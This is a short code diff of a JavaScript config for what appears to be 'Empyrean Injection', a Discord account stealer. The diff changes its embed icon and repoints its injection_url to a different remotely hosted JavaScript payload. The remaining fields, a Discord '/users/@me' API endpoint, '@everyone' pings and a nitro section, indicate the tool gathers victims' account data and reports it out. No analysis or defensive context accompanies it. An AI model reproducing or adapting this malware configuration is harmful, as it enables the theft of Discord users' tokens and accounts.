@@ -12,9 +12,9 @@ const config = {
   ping_on_run: false, 
   ping_val: '@everyone', 
   embed_name: 'Empyrean Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/main/imgs/pfp.png', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1000503297091842149/1070632417880191057/eyes.webp', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/master/obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/vooxil/stub/main/inject/root.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
